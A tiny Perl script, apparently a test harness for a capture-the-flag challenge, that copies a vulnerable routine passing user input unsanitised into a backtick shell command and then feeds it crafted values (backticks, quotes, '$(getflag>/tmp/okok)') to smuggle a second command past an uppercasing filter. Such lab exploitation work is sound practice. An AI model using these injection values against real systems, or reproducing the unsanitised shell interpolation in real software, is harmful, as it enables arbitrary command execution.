#!/usr/bin/env perl

sub t {
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  print $xx;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  print "OUTPUTT:";
  print $output
}

#t("\$(getflag>/tmp/okok)");
t("\"\`+\`getflag>\\");
#t("getflag");
